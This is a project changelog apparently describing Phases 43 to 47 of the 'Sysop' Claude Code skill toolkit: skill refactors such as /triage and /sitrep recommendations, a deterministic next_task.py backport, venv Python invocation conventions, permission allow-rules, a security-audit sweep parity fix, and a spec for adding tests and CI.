Option (b) won because the patterns are pipeline-shape-specific (vendor-ingest, not Python-in-general), the beancount pack already existed in the marketplace as a declared placeholder waiting for exactly this kind of seeding, and the placeholder vocabulary lets a future consumer with the same shape (any "raw vendor dump → normalized ledger" project — small-business bookkeeping, hledger users, even non-financial pipelines that download per-vendor structured data and gate on schema drift) reuse the rules verbatim. Option (a) would have polluted the python pack with patterns most Python projects don't have. Option (c) is the safest against premature generalization but leaves ISSUE-0036/0037 unabsorbed for an unknown duration, which contradicts the "absorb friction from the first real consumer" cadence Phases 4 onward have established.

**Pack dependency chain.** The beancount pack's `plugin.json` already declares `dependencies: ["sysop", "sysop-python"]` — the python pack always loads before beancount, so the overlay sections (e.g., `<parsers dir>/*.py` adding to python's general Python conventions) compose cleanly without redundant rules. No changes to the manifest or the marketplace listing — beancount was already in `.claude-plugin/marketplace.json` from Phase 2J.

**Scope (43b).** Two new files (`packs/beancount/companion/{convention_map,security_map}.md`, ~110 lines total) under a pre-existing `packs/beancount/.claude-plugin/` manifest. No new manifest, no marketplace.json change, no installer change, no script change. The `companion/` subdir was created by the write (no `mkdir`-as-separate-commit needed — `git add` handles it).

**First downstream consumer.** BeanRider absorbs both sub-phases via the next `bash scripts/sysop-update.sh` cycle. 43a's four skill / script changes exercise immediately — every `/review-close` cycle hits the new routing-table prose and the lock-unlink path; every `/claim-task` under auto-mode hits the chaining note; `close_batch.sh` runs on every multi-batch close. 43b's pack files become available when BeanRider's `--update` discovers the beancount pack — BeanRider's existing `.claude/convention_map.md` and `.claude/security_map.md` already have project-specific `data/**` and `parsers/*` sections; the absorption is to fold the now-upstream beancount-pack content in alongside the python pack and have BeanRider's local-appended sections shrink to project-specific overrides only. No deferred verification — the changes are prose / heredoc / script-tail edits and the patterns were lifted from BeanRider's filed ISSUE entries verbatim.

**Things explicitly NOT in scope.** A `_shared/silent-deny-escape.md` factor (suggested by ISSUE-0033's diagnosis) is deferred — Phase 36's `PermissionDenied` hook already collapses the silent-deny prose to a hook reference, and the remaining mentions across Steps 3 / 4c / 4d / 6 are each two lines apiece, below the "extract a shared file" threshold. The Step 6 janitor for stale locks from prior cycles (ISSUE-0035 secondary option) is deferred — operators can `rm .locks/*.lock` for completed task IDs by hand once; steady-state cleanup is now correct. The `/document-work → /review-close` auto-chain (extension of ISSUE-0038's pattern) is deferred — `/review-close` is the senior-reviewer merge gate by design.

## Phase 44

Phase 44 (2026-05-27) extracts review-batch classification into a dedicated `/triage` skill and turns `/sitrep` into a routing recommender. The trigger: cold-resuming after a break or a `/clear`, the operator runs `/sitrep`, sees a list of pending batches, and has to mentally decide whether to run `/auto-review` (mechanical), `/auto-judge` (judgment-required), `/triage` first to assess, or `/auto-claim` against the roadmap. The pre-Phase-44 `/sitrep` emitted a `SUGGESTED ORDER` list of state-derived next-actions but did not name a single top recommendation, did not differentiate auto vs flag batches, did not surface what `/auto-claim` would pick up on the roadmap side, and did not nudge `/clear` before launching agent-heavy skills. The user asked whether `/sitrep` should consume `/auto-review --dry-run`'s classification, run that classification itself, or have a separate skill own it. We landed on **extract** — classification is a cross-cutting concern that belongs in its own skill, with `/auto-review` and `/auto-judge` invoking it as a prereq and `/sitrep` consuming its persisted output. The architectural instinct ("if you were writing this in code, you'd extract this as a function") translates cleanly to skills even though skills aren't literal functions — the equivalent is a standalone skill that other skills invoke at their Step 0.5 and `/sitrep` reads metadata from.

**New skill: `/triage`** (`core/skills/triage/SKILL.md`, ~85 lines). Single-purpose classifier. Reads `review_tasks.md`, finds every pending batch lacking a `> **Flag:**` tag, applies the auto-vs-flag rules (open-ended design choice / external knowledge / architectural refactoring / no prescriptive fix → flag; prescriptive remediation + file:line + known pattern → auto), and persists the verdict by writing `> **Flag:** <reason>` lines into the batch headers. The skill owns Step 1b (preserve uncommitted `review_tasks.md`) and Step 3b (persist Flag tags) that used to live in `/auto-review`. It supports `--dry-run` (classify and print the table without writing tags) and exits idempotently when every pending batch is already tagged. The Step 5 closing recommendation names the next skill (`/auto-review`, `/auto-judge`, both concurrent, or none) based on the post-triage queue.

**`/auto-review` shrink** (`core/skills/auto-review/SKILL.md`). Three removals + one addition. Removed: Step 1b (preserve uncommitted), the entire Step 2 classification rules (~20 lines of auto-vs-flag heuristics), Step 3b (Flag-tag persistence), and the `--dry-run` argument (use `/triage --dry-run` instead). Added: Step 0.5 ("if any pending batch lacks a `Flag:` tag, invoke `/triage` via the Skill tool and wait for it to complete, then re-read `review_tasks.md`"). Step 1 now reads only auto batches (those without a `Flag:` tag); flagged batches are explicitly skipped and surfaced in the Step 5 "Flagged for Judgment" sub-table. Step 2 plan-table simplifies to auto-only columns (drops the `Class` and `Reason` columns since /triage owns that surface). Step numbers 4 and 5 were left as-is — renumbering 4a/4b/4c/4d/4e + cross-refs ("proceed to Step 4c") to 3a/3b/etc. has high edit-risk for cosmetic gain; the Step 3 gap is acceptable because no external skill cross-references /auto-review's outer step numbers (the inner agent prompts use their own Step 1-7 numbering, independent of the outer skill).

**`/auto-judge` shrink** (`core/skills/auto-judge/SKILL.md`). Same shape, lighter touch — `/auto-judge` already only processed flagged batches, so the surface change is small. Removed: Step 1b (preserve uncommitted — now owned by `/triage`). Added: Step 0.5 (same prereq-invocation pattern as `/auto-review`). Updated: top-of-file description renames `/auto-review` → `/triage` as the upstream that flags batches ("Automatically process pending review batches that **`/triage`** flagged for judgment"). Kept: `--dry-run`. The flag categorizes-by-keyword logic in Step 2 (design-choice / architectural / investigation / verification / other) is `/auto-judge`-specific — it primes the per-batch Opus agent's framing, distinct from `/triage`'s auto-vs-flag classification — so it stays. Step 2's `--dry-run` use case (preview the category framing per batch without spawning Opus agents) is preserved.

**`/sitrep` recommendation block** (`core/skills/sitrep/SKILL.md` + `core/companion/scripts/sitrep_survey.py`). The script gains a `Recommendation` dataclass (command + reason + clear_nudge + detail_lines) and a `_recommended_next(s)` priority-cascade function that returns the single top routing call. Priority order: (1) any task `ready for /review-close`, (2) any review batch with all tasks Doc-Work'd, (3) any task `doc-work done, unpushed`, (4) pending unclaimed batches — `/triage` if any lack tags, then `/auto-review` + `/auto-judge` concurrent if mixed, then `/auto-judge` if flag-only, then `/auto-review` if auto-only, (5) in-progress tasks, (6) planning tasks, (7) `/auto-claim` with a sample of `tasks/index.yml` open IDs, (8) idle. First match wins. The `/clear` nudge fires on priorities 4b/4c/4d/7 — the agent-spawning skills. `render_text` prints `RECOMMENDED NEXT` above the existing `SUGGESTED ORDER` (preserved unchanged so consumers can ignore the recommendation and read the full state). `render_json` adds `recommended_next` (or `null`) and `open_roadmap_ids` to the structured output for orchestrator consumption. The review-batch line's `next:` field now routes per-batch: flagged-pending batches show `/auto-judge will pick this up — flag: <reason truncated to 55 chars + ellipsis>`; untagged-pending batches show `/triage will classify (then /auto-review or /auto-judge picks it up)`. Flag-reason parsing added via new `_META_FLAG_RE` regex; `ReviewBatchState` extended with `has_flag` + `flag_reason` fields; `Survey` extended with `open_roadmap_ids` (sorted list of task IDs with `status: open` in `tasks/index.yml`).

**Read-only invariant defended.** `/sitrep` does NOT auto-invoke `/triage` even when it detects untagged pending batches. Decision rationale: the read-only property is what makes `/sitrep` safe to run reflexively when cold-resuming — there is no risk of "did that just write something?" — and turning `/sitrep` into a mutating skill would be a category change future-operators might forget about when troubleshooting. The cost of the alternative is one extra keystroke (run `/triage`, then re-run `/sitrep` to see the updated recommendation), which fires only when new batches have landed since the last triage. The user posed this as a real decision point; the chosen answer is preserved explicitly in `/sitrep`'s SKILL.md § "Why /sitrep does not auto-invoke /triage" so the rationale survives future editing pressure.

**Installer permission template** (`core/companion/.claude/settings.json`). Three new allow-rules: `Bash(git add review_tasks.md)` (Phase 6 pattern — narrow exact-string, no glob) and `Bash(git commit -m docs:*)` (mirrors the `claim:*` / `rollback:*` prefix-only rules). The third addition is the pair-completion: pre-Phase-44 `/auto-review` Step 1b and Step 3b also stage and commit `review_tasks.md` under `docs:`-prefixed messages, but the rules were never explicitly listed — relying on Claude Code's classifier to auto-approve, which is brittle under `auto` mode + `skipAutoPermissionPrompt: true` (the silent-halt pattern Phase 6 catalogued). With classification moved into `/triage`, the rules are now declared explicitly in `/triage`'s permission guard and installed via the template, so the silent-halt risk is closed for every consumer that runs `sysop-update.sh` after this phase.

**Smoke test against BeanRider.** Ran `sitrep_survey.py` from inside `~/Projects/BeanRider`: surfaced 4 review batches (Batch 25 in-progress, Batches 30/32/33 pending-with-Flag-tag) and correctly emitted `RECOMMENDED NEXT → /auto-judge` with reason "3 flagged batch(es) need Opus judgment" and the `/clear` nudge. `--json` output exposes `recommended_next` as a structured object and `open_roadmap_ids` listing FEAT-0044 / FEAT-0045 / TECH-0004 (BeanRider has open roadmap tasks but pending review batches take priority — confirms the cascade ordering). The script change is backwards compatible — pre-Phase-44 `review_tasks.md` files without Flag tags parse cleanly (`flag_reason` defaults to empty, `has_flag` defaults to False, the recommendation routes to `/triage`).

**Things explicitly NOT in scope.** Decision-blocker plumbing (🚩 marker or `> **Block:**` tag for "needs human decision before any auto-* can run") is deferred — there is no real convention for it today, the use case is rare in practice, and modeling it without 2-3 real examples is premature. A weight-aware `/auto-claim` preview from `/sitrep` (showing which roadmap tasks fit under the K=6 ceiling per `/auto-claim`'s rules) is deferred — the current preview shows just a count + top-3 open IDs, which is enough to make the routing call; richer detail would require duplicating `/auto-claim`'s weight computation here or extracting it into a shared `scripts/auto_claim_preview.py` helper, neither of which is justified until a consumer asks for it. Renumbering `/auto-review`'s outer steps from 0/1/2/4/5 down to 0/1/2/3/4 is deferred indefinitely — the Step 3 gap is harmless documentation slack, and the renumbering would touch 4a/4b/4c/4d/4e + every "proceed to Step 4c" / "see Step 4d" cross-reference inside the (already long) skill prose. The `/auto-review --merge` and `/auto-judge --merge` paths are unchanged — `--merge` is still the secondary pass for overlapping batches, and Phase 44 does not touch the overlap-resolution logic.

**First downstream consumer.** BeanRider absorbs Phase 44 via the next `bash scripts/sysop-update.sh` cycle. The behavioral change is most visible on the next `/sitrep` invocation (new RECOMMENDED NEXT block at the top of the report) and on the next `/auto-review` or `/auto-judge` invocation against an untriaged pending batch (Step 0.5 invokes `/triage` first instead of inline-classifying). The installer template change picks up the two new permission allow-rules — BeanRider's `.claude/settings.json` will see them appear after the absorb. No schema bump, no script-rename, no marketplace.json change. The migration is forward-only — pre-Phase-44 batches that already carry `Flag:` tags from the old `/auto-review` Step 3b code path are read identically by `/triage` (same regex, same semantics).

## Phase 45

Phase 45 (2026-05-27) is a two-commit absorption of two gdp skill updates that pre-date today but had not yet been ported. The trigger: the user asked "compare Sysop skill to the current state in gdp-query and tell me what the diffs are." The audit surfaced six gdp commits since Sysop Phase 42b's last absorption (2026-05-25) — two of them paired same-day (2026-05-27 telemetry + K=6→K=8 ramp, gdp `0b0ebb73` + `31c426ea`), one structural rewrite (2026-05-21 `/next-task` deterministic, gdp `e9b53c4e`), one ergonomics bundle (2026-05-20 `.venv/bin/python3` convention, gdp `d8696bda`), one review-pipeline addition (2026-05-20 `/codebase-review` ESLint + pip-audit ingest, gdp `2fdca506`), and one security-audit upgrade (2026-05-18 `8a79d4a7`). The user authorized "any that would provide value to Sysop users." Phase 45 ships the two lowest-risk, highest-isolation backports (`e9b53c4e` as Phase 45a and `d8696bda` as Phase 45b) and defers the telemetry pair to a REVIEW_CHECKLIST entry. The remaining three commits (codebase-review tools, security-audit sweep, ratchet-lint extraction) are scoped for follow-up phases.

**Why defer telemetry (`0b0ebb73` + `31c426ea`).** gdp's JSONL telemetry stack is the harness gdp used to validate the K=6 → K=8 batch-sum-ceiling ramp on the same day. The two changes are paired by design — porting the constant without the measurement infrastructure would be cargo-cult tuning of a value gdp picked from its own task-shape distribution. Sysop's lone consumer (BeanRider) won't produce enough `/auto-claim` cycles to populate the JSONL stream meaningfully — the same "≥ 10 batches first" rationale that already deferred `scripts/auto_claim_miner.py` (Filed 2026-05-21, REVIEW_CHECKLIST low-priority bucket). Filed both as a single deferred REVIEW_CHECKLIST entry next to the miner entry with promotion triggers (a) ≥ 10 consumer cycles under K=6, (b) consumer batch shape diverges from gdp's enough to suspect K=6 is wrong, (c) telemetry-emit overhead acceptable on consumer-scale invocations.

**Phase 45a — deterministic `/next-task` (gdp `e9b53c4e` backport).** Replaces the haiku-driven `core/skills/next-task/SKILL.md` selection prose (~174 lines, the Sysop-slimmed version of gdp's pre-rewrite 219-line original) with a 41-line wrapper that invokes `.venv/bin/python3 scripts/next_task.py $ARGUMENTS`. The new script (`core/companion/scripts/next_task.py`, 568 lines) reads `tasks/index.yml` + `review_tasks.md` + `.locks/` and prints the same Step 7 markdown the LLM skill produced. Runs in ~100ms instead of the 2–5s the haiku call took, zero per-call cost, deterministic output, and eliminates the `/next-task` (haiku) → `/claim-task` (opus) cross-model boundary. Frontmatter keeps `model: haiku` to match the convention every read-only lifecycle skill uses; the body is now a single Bash call the harness wraps in a haiku turn to print stdout back to the user. The LLM is no longer involved in selection logic.

- **Script content** — direct port of gdp's `scripts/next_task.py` with three Sysop generalizations: (1) docstring removes the reference to gdp's `agent/utils.py:_sanitize_log` (no equivalent in Sysop; the local copy is documented as a mirror of `validate_tasks.py:_sanitize_log`); (2) renames gdp's `_locks_dir()` helper to `_resolve_canonical_locks_dir()` to match Sysop's `validate_tasks.py` naming (Phase 32 established that name); (3) drops gdp's `.claude/checks.yml` `argparse-without-shared-cli` exclude-list reference from the docstring — Sysop's python pack `checks.yml.fragment` doesn't have that lint rule (no parallel maintenance burden). The `_USER_ACTION_KEYWORDS` token list also drops a few gdp-specific entries (`stripe dashboard`, `firebase`, `cloud sql proxy`, `vertex ai`) and keeps the generic ones (`console`, `dashboard`, `credentials`, `manual`, `manually`, `secret manager`, `gcloud auth`); a future consumer can extend the tuple via a follow-up patch.

- **Skill body** — `.venv/bin/python3 scripts/next_task.py $ARGUMENTS` (one line) with documentation of exit codes (0 = success including no-tasks paths, 1 = schema invariant violation, 2 = top-level safety net), an explanation of why `model: haiku` stays in the frontmatter (read-only-skill convention), and a "Why this skill exists at all" subsection naming the three properties the skill envelope preserves (discoverability, argument forwarding, future flexibility for any LLM reformat layer). The original 174 lines of LLM prose (the Step 1–7 spec) survives in the script's module docstring — single source of truth lives with the implementation.

- **Permission rules** — `core/companion/.claude/settings.json` gains both bare-`python3` and `.venv/bin/python3` variants: `Bash(python3 scripts/next_task.py)` / `Bash(python3 scripts/next_task.py:*)` (for non-venv consumers) and `Bash(.venv/bin/python3 scripts/next_task.py)` / `Bash(.venv/bin/python3 scripts/next_task.py:*)` (the preferred form, per Phase 45b's convention bump). The bare form is kept so non-venv consumers aren't broken; the venv form is what the skill body actually invokes.

- **Smoke test** — six scenarios against synthetic fixtures (no consumer dependency) using BeanRider's venv python (system `python3` lacks PyYAML on macOS): (1) default mode picks the lowest-effort agent task and renders body context + requirements; (2) `--review` mode surfaces the first pending batch with severity counts; (3) locking the top pick correctly falls through to the next; (4) locking every agent task falls through to the next pending batch then to the user-action fallback; (5) `schema_version: 0` triggers exit code 1 with the actionable error; (6) locking everything (tasks + batches) emits `No open tasks found` at exit 0. All passed. Observed one pre-existing rendering quirk inherited from gdp's code: review-batch task lines render the severity emoji twice (once inside the captured `rest` field, once appended as `sev_suffix`) — left unaddressed in this port (would diverge silently from gdp); a future quick-fix can drop the emoji from `rest` before re-rendering. No Sysop REVIEW_CHECKLIST entry filed for the dup-emoji — gdp will eventually trip on it if it matters; filing duplicate research wastes attention.

- **Tests NOT shipped.** gdp's commit included `tests/test_next_task.py` (697 lines, 41 tests). Sysop has no test infrastructure today — the installer doesn't have an `install_companion_tests()` function, and adding one would be a non-trivial install-path change. Tests would land at `<consumer-repo>/tests/test_next_task.py` once the installer grows that handler. Deferred to a follow-up phase or whenever a consumer first asks for the Sysop scripts to be covered by their own pytest setup. The script is small enough and the smoke test breadth is wide enough that the deferral is acceptable for first ship.

- **Scope (45a).** Two new files (`core/companion/scripts/next_task.py` 568 lines, plus the rewritten `core/skills/next-task/SKILL.md` 41 lines down from 174), one settings.json edit (four new allow-rule entries), the new REVIEW_CHECKLIST entry deferring telemetry. No installer change — the existing `install_companion_scripts()` loop picks up `next_task.py` automatically (Phase 3's directory-iteration shape).

**Phase 45b — `.venv/bin/python3` convention in skill files (gdp `d8696bda` backport).** Bumps the python invocation form used by skill bash blocks and advisory prose from bare `python` / `python3` to `.venv/bin/python3` across six call sites. gdp's commit message names the trigger: bare `python` is not on PATH when skills shell out via Bash, and bare `python3` works but lacks PyYAML on system-installed Python (especially macOS). The venv-prefixed invocation is the canonical Python for any Sysop script that imports a third-party package (`yaml`). Sysop's first real consumer (BeanRider) has a `.venv/` and was already adding venv-prefixed allow-rules to its own settings.json manually (`Bash(.venv/bin/python scripts/validate_tasks.py)` observed in BeanRider's allowlist pre-Phase-45). Phase 45b standardizes the form upstream so consumer-side manual additions stop being needed.

- **Imperative call-sites bumped (4 — match gdp d8696bda exactly).** `core/skills/auto-judge/SKILL.md` Step 1 advisory (`archive_review_tasks.py`), `core/skills/auto-review/SKILL.md` Step 1 advisory (same), `core/skills/claim-task/SKILL.md` Step 4c imperative (`validate_tasks.py`), `core/skills/review-close/SKILL.md` Step 6 (last imperative `validate_tasks.py` invocation in the closing heredoc). gdp d8696bda also bumped its `db-status` skill — Sysop doesn't ship a `db-status` skill (gdp-specific), so it's skipped without divergence.

- **Sysop-specific extra bumps (2).** `core/skills/triage/SKILL.md` Step 1 advisory (`archive_review_tasks.py`) — `/triage` is Sysop's Phase 44 skill that doesn't exist in gdp; absorbing the convention here keeps the three sibling skills (`/triage`, `/auto-review`, `/auto-judge`) consistent. `core/skills/review-close/SKILL.md` Step 4c prose paragraph (also references `validate_tasks.py` in narrative; bumped for prose-vs-code-invocation consistency in the same skill).

- **Permission allow-rule additions** — `core/companion/.claude/settings.json` gains `Bash(.venv/bin/python3 scripts/validate_tasks.py)` / `Bash(.venv/bin/python3 scripts/validate_tasks.py:*)` and `Bash(.venv/bin/python3 scripts/archive_review_tasks.py:*)`. The bare `python3` rules stay (non-venv consumers, `python3 -:*` heredocs, `python3 -c:*` evaluation) — both shapes coexist as redundant rules in the allowlist rather than forcing a fork between venv and non-venv consumers.

- **Skill permission-doc updates** — five skill files document the required allowlist entries (claim-task, auto-claim, review-close, codebase-review, security-audit). Each gets the venv variant appended next to the existing bare entry with a parenthetical "Phase 45b preferred form; bare entry remains for non-venv consumers." This preserves the existing skill prose's intent (failing fast when a required rule is missing) while expanding the catalogue to match the venv-bumped invocations. Skills that don't actually invoke python from their own bash blocks (auto-judge, auto-review, triage — all of these only reference `archive_review_tasks.py` as user-advisory) keep their permission lists unchanged; no new rules are needed for an invocation the skill never makes.

- **What's intentionally NOT bumped.** `core/skills/sitrep/SKILL.md`'s invocation of `python3 scripts/sitrep_survey.py` stays bare. `sitrep_survey.py` is Sysop-specific (no gdp parallel) and the gdp d8696bda commit hit list didn't establish a convention for new Sysop scripts. A consumer running `/sitrep` from a system python with PyYAML installed succeeds either way; switching to `.venv/bin/python3` would force a venv requirement on a read-only diagnostic that doesn't otherwise need one. Same for `/auto-claim`'s line 221 (already `.venv/bin/python3` from a prior phase) — confirmed; no change needed.

- **Scope (45b).** Six skill files edited (auto-judge, auto-review, triage, claim-task, review-close [two sites], one settings.json edit (three new allow-rule entries), five skill permission-doc updates (claim-task, auto-claim, review-close, codebase-review, security-audit). Backward compatible — the bare `python3` and `python` rules stay in the allowlist; only the skill bodies' explicit invocations change shape, and any consumer whose `.venv/bin/python3` is missing gets a clean `command not found` instead of a silent PyYAML import failure.

**First downstream consumer.** BeanRider absorbs both sub-phases via the next `bash scripts/sysop-update.sh` cycle. 45a delivers `next_task.py` into BeanRider's `scripts/` directory (the existing `install_companion_scripts` loop picks it up); the next `/next-task` invocation runs the deterministic resolver instead of the haiku-driven selection prose. 45b's six skill edits take effect on the next `/claim-task` / `/review-close` / `/auto-review` / `/auto-judge` / `/triage` cycle; BeanRider's settings.json absorbs the new allow-rules via the installer's set-union merge (Phase 6 pattern). No schema bump, no migration path, no marketplace.json change.

**Things explicitly NOT in scope.** Tests for `next_task.py` (no Sysop test infrastructure today; gdp's 697-line test suite stays upstream until Sysop grows a `core/companion/tests/` directory). Bumping `core/skills/sitrep/SKILL.md` to `.venv/bin/python3` for `sitrep_survey.py` (read-only diagnostic; venv requirement would over-constrain). Backporting the pre-existing emoji-duplication bug fix in gdp's `format_batch_output` (would diverge silently; let gdp fix upstream). Auditing or addressing the four remaining gdp commits in the same absorption batch (`2fdca506` codebase-review ESLint+pip-audit ingest, `8a79d4a7` security-audit upgraded sweep tree, `211727f6` `run_ratchet_lint.sh` extraction, plus the deferred telemetry pair) — each is its own phase decision, queued for follow-up.

## Phase 46

Phase 46 (2026-05-27) ports gdp's `/security-audit` upgraded sweep tree (gdp `8a79d4a7`, 2026-05-18) so `/security-audit` Step 9 sub-step d is byte-for-byte equivalent to its `/codebase-review` sibling. Tiny in scope — one file, +8 -5 lines — but resolves a long-standing symmetry gap: a security convention promoted via `/security-audit` now gets the same LSP-backed symbol propagation pass that a quality convention does via `/codebase-review`. gdp closed this in their `TECH-SECURITY-AUDIT-SWEEP-PARITY` task; Sysop had carried the legacy single-grep path since the original skill extraction. Picked up as the lowest-effort cleanup remaining from the Phase 45 gdp absorption audit — `8a79d4a7` was one of three commits explicitly named in Phase 45's "Things NOT in scope" paragraph as queued for follow-up.

**The change.** Sub-step d of Step 9 (Convention Promotion → Sweep for existing violations) gets a four-branch anchor-type routing tree to replace the legacy "derive a grep pattern, then if not mechanically searchable skip" prose:

- **Symbol-anchored convention** (e.g., "all callers of `get_verified_user` must also call X"): use `LSP.findReferences` on the symbol via Claude Code's built-in `LSP` tool. Catches import aliases and renames that grep misses.
- **Pattern-anchored convention** (e.g., "all `fetch()` calls with dynamic paths need `encodeURIComponent()`"): derive a grep pattern from the anti-pattern. Use the `Map Sections` column to scope the search. Search for the anti-pattern, not the correct pattern.
- **Already mechanized** (option a.i or a.ii was taken): skip the derive step and use the rule's first-run output as the violation list. `bash scripts/run_checks.sh` for checks.yml; `semgrep --config .claude/semgrep/<rule>.yaml` for semgrep.
- **Not mechanically searchable** (requires AST analysis, semantic understanding, or multi-file context): skip and note "Sweep skipped — pattern not mechanically searchable."

The orphan "if not mechanically searchable" sub-step (line 553 pre-Phase-46) gets folded into the routing tree as the fourth branch. Steps 4 and 5 (Present sweep summary, Wait for reviewer's decision) renumber to 3 and 4 because the new routing tree absorbs both old steps 1 and 3 into a single step 1.

**Why this matters.** Before Phase 46, a security-flavored convention discovered during `/security-audit` (e.g., "every endpoint that returns user data must check tier") got a grep-only sweep that missed import aliases and renames. The same convention discovered during `/codebase-review` got the LSP-backed sweep already (Phase 46 leaves codebase-review's tree untouched — it was already correct). For consumers whose security-critical code uses Python imports or TypeScript aliases, this closes a quiet false-negative — a sweep that returned 0 hits not because the pattern was clean but because grep couldn't see the renames.

**Sibling parity proven by `diff`.** After the port, `diff core/skills/codebase-review/SKILL.md (lines 545-566)` vs `core/skills/security-audit/SKILL.md (lines 550-571)` returns no differences — both sub-step d blocks are byte-identical (modulo line numbers). Only intentional security flavoring remains outside d: the OWASP category metadata in Step 1, and the OWASP A01/A07 access-control callout in option (iv) prose-fallback (the canonical fallback list at line ~531). gdp's commit message names these as the deliberate divergence.

**Scope.** One file edited (`core/skills/security-audit/SKILL.md`), +8 -5 net lines across two contiguous regions (anchor-type list insertion + step renumber). No new files, no installer change, no permission-rule change, no script change. Backward compatible — the routing tree is structurally additive (it absorbs the legacy single-grep path as the new branch 1.b "Pattern-anchored"), so any consumer's existing in-flight `/security-audit` convention sweep that was applying the old prose still maps to a valid branch in the new tree.

**Phase 47 deferral (gdp `2fdca506`).** The remaining heavy backport from the Phase 45 absorption audit — gdp's `/codebase-review` ESLint + pip-audit ingest (`2fdca506`, 2026-05-20) — is filed as a Medium-priority REVIEW_CHECKLIST entry with no deferral trigger (just queued for the next absorption window). Scope estimate: ~600-line diff (gdp's `scripts/run_checks_impl.py` +221, `tests/test_run_checks.py` +319, `.claude/checks.yml` +41, plus skill/doc edits). Three sub-decisions for Phase 47 design: (a) port the two Python helpers and generalize gdp's hardcoded `frontend/node_modules/{eslint,eslint-config-next}` + `requirements.txt:1` paths to Sysop placeholder vocabulary; (b) decide the tests question — defer like Phase 45a did, extend the installer to ship `core/companion/tests/`, or stand up Sysop-side CI under a new top-level `tests/`; (c) skill table edits for `/codebase-review` Step 2b and `/security-audit` Step 2b-2 (both gain `lint-error` and `pip-audit-vuln` registry-entry rows). Filed during Phase 46 commit prep so future sessions can find it via `grep -E "Filed 2026-05-27 by Phase 46"`. **Update 2026-05-27:** Phase 47 spec filed at [`PHASE_47_SPEC.md`](./PHASE_47_SPEC.md) (commit `a271462`); see Phase 47 section below for the design narrative.

**First downstream consumer.** BeanRider absorbs Phase 46 via the next `bash scripts/sysop-update.sh` cycle. The behavioral change is visible on the next `/security-audit` round that promotes a symbol-anchored security convention — instead of a grep-only sweep that misses Python import aliases, the agent now routes through `LSP.findReferences` and surfaces all callers regardless of alias / rename. For consumers whose security code is grep-friendly (no aliases, no dynamic dispatch), behavior is identical to pre-Phase-46. No schema bump, no migration path, no marketplace.json change.

**Things explicitly NOT in scope.** Touching `/codebase-review` Step 9 sub-step d (already had the routing tree from a prior phase — gdp's `7b7592e9` 2026-05-19 or earlier; the sibling skills' divergence existed only on the security side). Extending the routing tree to other skills (`/triage`, `/review-close`, etc. — none of them have a convention-sweep step). Auditing Sysop's `_shared/` partials for the LSP convention's worded equivalence (`_shared/adversarial-review.md` doesn't reference convention promotion; out of scope). The `2fdca506` ESLint + pip-audit ingest is filed for Phase 47 (see above) and intentionally NOT bundled here — the two changes are independent and bundling would balloon Phase 46 from a 15-line cleanup into a full-day port for no upside.

## Phase 47 (spec filed 2026-05-27 — pending execution)

Phase 47 (spec commit `a271462`) is the first Sysop phase to land as a **design spec without execution** — full design narrative + adversarial-review-incorporated implementation steps are filed at [`PHASE_47_SPEC.md`](./PHASE_47_SPEC.md), and execution is queued for the next absorption window. Goal: port gdp commit `2fdca506` (the `/codebase-review` ESLint + pip-audit ingest) into Sysop **with tests**, by first standing up Sysop's own `tests/` directory + GitHub Actions CI, then using that infrastructure to land `2fdca506` and backfill previously-skipped test files from Phases 36 / 37 / 40 / 44 / 45a.

**The three-option choice + rationale.** The Phase 46 deferral paragraph (above) named three sub-decisions for Phase 47 design; (b), the "tests question," is the load-bearing one. Options surveyed:

- **(a) defer like Phase 45a:** lowest-friction for the immediate port but locks in a precedent that every untested Python helper inherits going forward. Sysop's untested Python surface is ~6800 lines across 11 scripts today; the trend is +200–600 lines per absorption (Phase 36 added 206 to `permission_denied_hook.py`, Phase 37 added 274 to `parse_subagent_envelope.py`, Phase 40 + Phase 44 grew `sitrep_survey.py` to 1278, Phase 45a brought `next_task.py` to 900). Path-of-least-resistance accrues debt linearly.
- **(b) installer ships `core/companion/tests/` to consumer:** doubles `install.sh` surface, makes consumer responsible for running upstream's tests, adds `pytest` as an install-side dep. Wrong split of responsibility — tests for upstream code should run upstream.
- **(c) stand up Sysop-side `tests/` + CI:** the right long-term answer. Pays an infrastructure cost once that amortizes across every future helper. Pinned by the spec.

**(c) chosen.** The infrastructure cost is finite (one phase, ~1 day for 47a); the debt cost of (a) is unbounded. Spec § 1 records both rejected alternatives so future sessions can audit the trade.

**Comprehensive test-debt inventory.** The spec includes (per the user's explicit "comprehensive incorporation" requirement) a full enumeration of every Sysop Python helper today, with gdp counterpart-test status:

- **Three with gdp tests, ported by Phase 47:** `next_task.py` (900L Sysop vs 916L gdp, gdp `test_next_task.py` is 697L / 41 functions); `validate_tasks.py` (1437L Sysop vs 1134L gdp, gdp `test_validate_tasks.py` is 227L / 8 functions); `run_checks_impl.py` (852L → 1073L post-port Sysop vs 986L gdp, gdp `test_run_checks.py` is 733L / 21 functions post-`2fdca506`).
- **Seven with no gdp counterpart, filed for follow-up phases:** `sitrep_survey.py` (1278L), `archive_review_tasks.py` (555L), `review_index.py` (504L), `parse_subagent_envelope.py` (274L), `permission_denied_hook.py` (206L), `backfill_completed_dates.py` (221L), `auto_claim_miner.py` + `_v2.py` (641L combined).
- **Two gdp tests inapplicable to Sysop:** `test_validate_release_schedules.py` (BLS-specific), `test_run_ratchet_lint.sh` (script Sysop does not have).

The spec puts items 1–3 in scope and 4–7 in § 3.47d as named follow-up REVIEW_CHECKLIST entries — the debt is now visible rather than implicit.

**Adversarial review surfaced 12 findings, all `fixable`, all incorporated.** Spawned per `_shared/adversarial-review.md` Prompt Template (general-purpose / opus / fresh context). Highlights:

- **P0 factual drift:** the first draft had gdp's `next_task.py` at 568 lines (actual: 916), making Sysop's 900-line script look 332 lines heavier when it's actually ~16 lines LEANER; gdp's `validate_tasks.py` characterized as "much smaller" when delta is +303 not order-of-magnitude; `2fdca506` characterized as "+4 new tests atop 5" when it's a 5 → 21 rewrite (+16 functions); gdp test function counts mis-stated by 2× in opposite directions for two files. The drift inverted the spec's narrative about which direction Sysop had diverged from gdp.
- **P1 convention regressions:** GHA workflow in the first draft was missing SHA-pinned actions, `concurrency:` group, `permissions: contents: read`, scoped `pull_request.types` — three security/reliability conventions gdp's `backend-test.yml` already established. Revised to verbatim gdp-shape parity (Phase 46 sibling-parity discipline applied here too).
- **P1 silent failure mode:** `requirements-dev.txt` pinning dev deps without a runtime `requirements.txt` would have masked the fact that Sysop has no production lockfile. Revised to add a comment block explaining the design (Sysop is a meta-repo, not an installable package; consumer venvs provide runtime deps via try/except imports).
